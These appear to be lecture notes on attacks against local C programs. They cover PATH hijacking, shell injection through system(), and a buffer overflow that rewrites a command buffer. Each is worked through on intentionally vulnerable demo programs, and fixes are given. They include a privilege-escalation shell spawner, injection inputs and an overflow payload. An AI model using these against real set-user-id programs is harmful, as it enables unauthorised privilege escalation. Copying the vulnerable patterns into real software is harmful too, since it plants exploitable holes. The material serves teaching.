
# Security: Attacks on System Programs

> **This material directly adapted from Prof. Aviv's [material](https://classes.adamaviv.com/ic221/s18/units/07/unit.html#org67f4730).**

It is an unfortunate truth of security that all programs have faults because humans have faults — human's write programs.
As such, we will take some time to understand the kinds of mistakes you, me, and all programmers may make that can lead to security violations.

This is a broad topic area, and we only have a small amount of time to talk about it.
We will focus on three classes of attack that are very common for the kinds of programs we've been writing in this course.

- *Path Lookup Attacks*: Where the attacker leverages path lookup to compromise an executable or library
- *Injection Attacks*: Where an attacker can inject code, usually in the form of bash, into a program that will get run.
- *Overflow Attacks*: Where the attack overflows a buffer to alter program state.

In isolation, each of these attacks can just make a program misbehave; however, things get interesting when you have privilege escalation, such as with the set-bits.
A privilege program that can be exploited will be able to perform arbitrary tasks.

Each of these topics have great nuance, and the hope is to give you a general overview so you can explore the topic more on your own.

## Path Attacks

We've been using path lookup throughout the class.
Perhaps the best example is when we are in the shell and type a command:

```
aviv@saddleback: demo $ cat helloworld.txt
Hello World
```

The command cat is run, but the program that is actually cat's the file exists in a different place in the file system.
We can find that location using the which command:

```
aviv@saddleback: demo $ which cat
/bin/cat
```

So when we type cat, we are really executing /bin/cat which is found by exploring the PATH enviroment variable:

```
aviv@saddleback: demo $ echo $PATH
/home/scs/aviv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Each of the directories listed is searched, in order, until that command is found.
Environment variables are global variables set across programs that provide information about the current environment.

The `PATH` environment variable is a perfect example of this, and the customizability of the environment variables.
If you look at the directories along my path, I have a bin directory Win my home directory so I can load custom binaries.
The fact that I can customize the `PATH` in this way can lead to some interesting security situations.

### `system()`

To help this conversation, we need to introduce two library functions that work much like `execvp()` with a `fork()`, like we've done all along, but more compact.
Here's the description in the manual page:

```
NAME
       system - execute a shell command

SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);

DESCRIPTION

       system() executes a command specified in command by calling
       /bin/sh -c command, and returns after the command has been
       completed.  During execution of the command, SIGCHLD will be
       blocked, and SIGINT and SIGQUIT will be ignored.
```

That is, the `system()` function will run an arbitrary shell command.
Let's look at a very simple example, a "hello world" that uses two commands.

```
/*system_cat.c*/
#include <stdio.h>
#include <stdlib.h>

int main(){
  system("cat");
}
```

```
aviv@saddleback: demo $ echo "Hello World" | ./system_cat
Hello World
```

The `system_cat` program runs cat with `system()`, and so it will print whatever it reads from stdin to the screen.
It turns out, that this program, despite its simplicity, actually has a relatively bad security flaw.
Let's quickly consider what might happen if we were to change the `PATH` value to include our local directory:

```
aviv@saddleback: demo $ export PATH=.:$PATH
aviv@saddleback: demo $ echo $PATH
.:/home/scs/aviv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

So now the local directory is on the path, and if I were to create a program named cat, then that cat would run instead of the one you would expect.
For example, here is such a program:

```
/*cat.c*/
#include <stdlib.h>

int main(){

  system("echo 'Goodbye World'");
}
```

Now, when we run our program for system_cat, we don't get the same result:

```
aviv@saddleback: demo $ echo "Hello World" | ./system_cat
Hello World
aviv@saddleback: demo $ make
clang -g -Wall    cat.c   -o cat
aviv@saddleback: demo $ echo "Hello World" | ./system_cat
Goodbye World
```

This is not just a problem with the `system()` command, but also `execvp()`, which will also look up commands along the path.

```
#include <unistd.h>

int
main(void)
{
	char * args[] = {"cat",NULL};

	execvp(args[0],args);

	return 0;
}
```

```
aviv@saddleback: demo $ echo "Hello World" | ./execvp_cat
Hello World
aviv@saddleback: demo $ make
clang -g -Wall    cat.c   -o cat
aviv@saddleback: demo $ echo "Hello World" | ./execvp_cat
Goodbye World
```

How do we fix this? There are two solutions:

1. Always use full paths. Don't specify a command to run by its name, instead describe exactly which program is to be executed.
2. Fix the path before executing using setenv()

You can actually control the current `PATH` setting during execution.
To do this you can set the enviorment variables using `setenv()` and `getenv()`

```
#include <stdlib.h>
#include <unistd.h>

int main(){

  //ensure the enviorment only has the path we want
  //and overwrite
  setenv("PATH","/bin",1);

  char * args[] = {"cat",NULL};

  execvp(args[0],args);

}
```

```
aviv@saddleback: demo $ echo "Hello World" | ./setenv_cat
Hello World
aviv@saddleback: demo $ make
clang -g -Wall    cat.c   -o cat
aviv@saddleback: demo $ echo "Hello World" | ./setenv_cat
Hello World
```

### Path attacks with set-user-id bits

Clearly, ensuring the PATH is correct is vitally important, but let's see what happens when we introduce set-user-id to the mix.
This time, I've set the program system_cat to be set-user-id in a place that others can run it:

```
aviv@saddleback: lec-24-demo $ chmod u+s system_cat
aviv@saddleback: lec-24-demo $ ls -l
total 12
-rwsr-x--x 1 aviv scs 9742 Mar 31 16:09 system_cat
```

Now as user m179998, I'm going to run the program.

```
m179998@saddleback: ~ $ echo "Hello World" | ~aviv/lec-24-demo/system_cat
Hello World
```

It works like `cat`, and so we are going to do a `PATH` attack again, by add the local directory to the path.

```
m179998@saddleback: ~ $ export PATH=.:$PATH
m179998@saddleback: ~ $ echo $PATH
.:/home/mids/m179998/bin:/usr/local/bin:/usr/bin:/usr/include:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

This time, instead of doing something silly with our version of cat lets do something not so silly.
Let's have it run a shell and also set our real user id:

```
#include <stdlib.h>
#include <stdlib.h>

int main(){

  char * args[]={"/bin/sh",NULL};

  //set our real uid to our effective uid
  setreuid(geteuid(),geteuid());

  execvp(args[0],args);

}
```

This time when we run the system_cat program, it will run bash as the set-user-id user. Now we've just escalated privilege.

```
m179998@saddleback:~$ ~aviv/lec-24-demo/system_cat
$ id
uid=35001(aviv) gid=15000(mids) groups=10120(scs),15000(mids),15001(ic221)
$ bash
bash: /home/mids/m179998/.bashrc: Permission denied
aviv@saddleback:~$
```

And now user `m179998` has become user `aviv`!

## Injection Attacks

Now, lets consider a situation where you use system() better.
You call all programs with absolute path and everything, but even that is not enough.
You must also consider injection attacks which is when the attacker can inject code that will run.
In our case, the injected code will be bash.

Consider this program which prompts the user for a file to cat out.

```
/* inject_system.c*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(){

  char cmd[1024] = "/bin/cat ./"; //will append to this string

  char input[40];

  printf("What input do you want to 'cat' (choose from below)\n");
  system("/bin/ls"); //show available files

  printf("input > ");
  fflush(stdout); //force stdout to print

  scanf("%s",input);//read input

  strcat(cmd,input); //create the command

  printf("Executing: %s\n", cmd);
  fflush(stdout); //force stdout to print

  system(cmd);


}
```

If we were to run this program, it does mostly what you expect:

```
aviv@saddleback: demo $ ./inject_system
What input do you want to 'cat' (choose from below)
cat.c	    execvp_cat.c   inject_system.c   input.txt	mal-lib		 overflow_system.c   run_foo	run_foo.o   setenv_cat.c   shared-lib  system_cat.c
execvp_cat  inject_system  inject_system.c~  Makefile	overflow_system  overflow_system.c~  run_foo.c	setenv_cat  setenv_cat.c~  system_cat  #system-ex.c#
input > inject_system.c
```

```
Executing: /bin/cat ./inject_system.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(){

  char cmd[1024] = "/bin/cat ./"; //will append to this string

  char input[40];

  printf("What input do you want to 'cat' (choose from below)\n");
  system("/bin/ls"); //show available files

  printf("input > ");
  fflush(stdout); //force stdout to print

  scanf("%s",input);//read input

  strcat(cmd,input); //create the command

  printf("Executing: %s\n", cmd);
  fflush(stdout); //force stdout to print

  system(cmd);

}
```

Ok, now consider if we were to provide input that doesn't fit this model.
What if we were to provide shell commands as input.

```
aviv@saddleback: demo $ ./inject_system
What input do you want to 'cat' (choose from below)
cat.c	    execvp_cat.c   inject_system.c   input.txt	mal-lib		 overflow_system.c   run_foo	run_foo.o   setenv_cat.c   shared-lib  system_cat.c
execvp_cat  inject_system  inject_system.c~  Makefile	overflow_system  overflow_system.c~  run_foo.c	setenv_cat  setenv_cat.c~  system_cat  #system-ex.c#
input > ;echo
Executing: /bin/cat ./;echo
/bin/cat: ./: Is a directory

aviv@saddleback: demo $
```

The input we provided was ";echo" the semi-colon closes off a bash command alowing a new one to start.
Notice that there is an extra new line printed, that was the echo printing.
Now, can we get this program to run something more interesting?

We still have the cat program we wrote that prints "Goodbye World" and the PATH is set up to look in the local directory.
Setting that up, we get the following result:

```
aviv@saddleback: demo $ ./inject_system
What input do you want to 'cat' (choose from below)
cat    execvp_cat    inject_system    inject_system.c~	Makefile  overflow_system    overflow_system.c~  run_foo.c  setenv_cat	  setenv_cat.c~  system_cat    #system-ex.c#
cat.c  execvp_cat.c  inject_system.c  input.txt		mal-lib   overflow_system.c  run_foo		 run_foo.o  setenv_cat.c  shared-lib	 system_cat.c
input > ;cat
Executing: /bin/cat ./;cat
/bin/cat: ./: Is a directory
Goodbye World
```

At this point, we own this program (pwn in the parlance).
If the program were set-user-id, we could escalate our privilege.

## Overflow Attacks

Two attacks down, moving onto the third. Let's now assume that the programmer has wised up to the two previous attacks. Now we are using full paths to executables and we are scrubbing the input to remove any potential bash commands prior to execution. The result is the following program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int
main(void)
{
	char cmd[1024] = "/bin/cat ./"; //will append to this string
	char input[40];

	printf("What input do you want to 'cat' (choose from below)\n");
	system("/bin/ls"); //show available files

	printf("input > ");
	fflush(stdout); //force stdout to print

	scanf("%s",input);//read input

  //clean input before passing to /bin/cat
	int i;
	for (i=0; i<40; i++) {
		if (input[i] == ';' || input[i] == '|' || input[i] == '$' || input[i] == '&') {
			input[i] = '\0'; //change all ;,|,$,& to a NULL
		}
	}

	//concatenate the two strings
	strcat(cmd,input);

	printf("Executing: %s\n", cmd);
	fflush(stdout);

	system(cmd);

	return 0;
}
```

```
aviv@saddleback: demo $ make
clang -g -Wall    cat.c   -o cat
clang -g -Wall    overflow_system.c   -o overflow_system
aviv@saddleback: demo $ ./overflow_system
What input do you want to 'cat' (choose from below)
cat    execvp_cat    inject_system    inject_system.c~	Makefile  overflow_system    overflow_system.c~  run_foo.c  setenv_cat	  setenv_cat.c~  system_cat    #system-ex.c#
cat.c  execvp_cat.c  inject_system.c  input.txt		mal-lib   overflow_system.c  run_foo		 run_foo.o  setenv_cat.c  shared-lib	 system_cat.c
input > ;cat
Executing: /bin/cat ./
/bin/cat: ./: Is a directory
#+END_SRC
```

This time, no dice, but the jig is not up yet.
There is an overflow attack.
Consider what happens when we increase the size of the input selection.
To do this programatically, I'm going to use a small trick of the python programming language to print a bunch of 'A's.

```
aviv@saddleback: demo $ python -c "print 'A'*10"
AAAAAAAAAA
aviv@saddleback: demo $ python -c "print 'A'*20"
AAAAAAAAAAAAAAAAAAAA
aviv@saddleback: demo $ python -c "print 'A'*30"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
aviv@saddleback: demo $ python -c "print 'A'*40"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
aviv@saddleback: demo $ python -c "print 'A'*50"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

I'm using this to produce strings of varying length, length 10, 20, 30, 40, and 50.
Those strings can be sent to the target program using a pipe.
And we can see the result:

```
aviv@saddleback: demo $ python -c "print 'A'*10" | ./overflow_system
What input do you want to 'cat' (choose from below)
cat    execvp_cat    inject_system    inject_system.c~	Makefile  overflow_system    overflow_system.c~  run_foo.c  setenv_cat	  setenv_cat.c~  system_cat    #system-ex.c#
cat.c  execvp_cat.c  inject_system.c  input.txt		mal-lib   overflow_system.c  run_foo		 run_foo.o  setenv_cat.c  shared-lib	 system_cat.c
input > Executing: /bin/cat ./AAAAAAAAAA
/bin/cat: ./AAAAAAAAAA: No such file or directory
aviv@saddleback: demo $ python -c "print 'A'*20" | ./overflow_system
What input do you want to 'cat' (choose from below)
cat    execvp_cat    inject_system    inject_system.c~	Makefile  overflow_system    overflow_system.c~  run_foo.c  setenv_cat	  setenv_cat.c~  system_cat    #system-ex.c#
cat.c  execvp_cat.c  inject_system.c  input.txt		mal-lib   overflow_system.c  run_foo		 run_foo.o  setenv_cat.c  shared-lib	 system_cat.c
input > Executing: /bin/cat ./AAAAAAAAAAAAAAAAAAAA
/bin/cat: ./AAAAAAAAAAAAAAAAAAAA: No such file or directory
aviv@saddleback: demo $ python -c "print 'A'*30" | ./overflow_system
What input do you want to 'cat' (choose from below)
cat    execvp_cat    inject_system    inject_system.c~	Makefile  overflow_system    overflow_system.c~  run_foo.c  setenv_cat	  setenv_cat.c~  system_cat    #system-ex.c#
cat.c  execvp_cat.c  inject_system.c  input.txt		mal-lib   overflow_system.c  run_foo		 run_foo.o  setenv_cat.c  shared-lib	 system_cat.c
input > Executing: /bin/cat ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
/bin/cat: ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such file or directory
aviv@saddleback: demo $ python -c "print 'A'*40" | ./overflow_system
What input do you want to 'cat' (choose from below)
cat    execvp_cat    inject_system    inject_system.c~	Makefile  overflow_system    overflow_system.c~  run_foo.c  setenv_cat	  setenv_cat.c~  system_cat    #system-ex.c#
cat.c  execvp_cat.c  inject_system.c  input.txt		mal-lib   overflow_system.c  run_foo		 run_foo.o  setenv_cat.c  shared-lib	 system_cat.c
input > Executing: /bin/cat ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
/bin/cat: ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such file or directory
aviv@saddleback: demo $ python -c "print 'A'*50" | ./overflow_system
What input do you want to 'cat' (choose from below)
cat    execvp_cat    inject_system    inject_system.c~	Makefile  overflow_system    overflow_system.c~  run_foo.c  setenv_cat	  setenv_cat.c~  system_cat    #system-ex.c#
cat.c  execvp_cat.c  inject_system.c  input.txt		mal-lib   overflow_system.c  run_foo		 run_foo.o  setenv_cat.c  shared-lib	 system_cat.c
input > Executing: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
```

Something changes at when the input string is 50 bytes long.
We overflow the buffer for the input.
Recall that the input buffer is only 40 bytes and size, and it is placed adjacent to the cmd buffer:

```
char cmd[1024] = "/bin/cat ./"; //will append to this string

char input[40];
```

When the input buffer overflows, we begin to write 'A's to cmd which replaces "/bin/cat".
Finally, we concatenate cmd with input, resulting in a long string of 'A's for the command being executed by `system()`.
We can see this from the error output.

How do we leverage this error to pwn this program?
The program is trying to execute a command that is "AAA…" and we can control the `PATH`.
Let's create such a program named "AAA…" Rather than writing a new program, we can use sym-linking.

```
ln -s cat AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
aviv@saddleback: demo $ ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goodbye World
```

Now when we execute the overflow, we get our desired "Goodbye World" result:

```
aviv@saddleback: demo $ python -c "print 'A'*50" | ./overflow_system
What input do you want to 'cat' (choose from below)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
cat
cat.c
execvp_cat
execvp_cat.c
inject_system
inject_system.c
inject_system.c~
input.txt
Makefile
mal-lib
overflow_system
overflow_system.c
overflow_system.c~
run_foo
run_foo.c
run_foo.o
setenv_cat
setenv_cat.c
setenv_cat.c~
shared-lib
system_cat
system_cat.c
#system-ex.c#
input > Executing: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goodbye World
```

How do we fix overflow bugs?
The most direct way is to always bound checks on strings.
For example, always use `strncp()` or `strncat()`, but that is even sometimes not sufficient.
In the end, it requires good programmers who understand security and can identify bad programming practices.
This is just a small set of examples of bad programs.
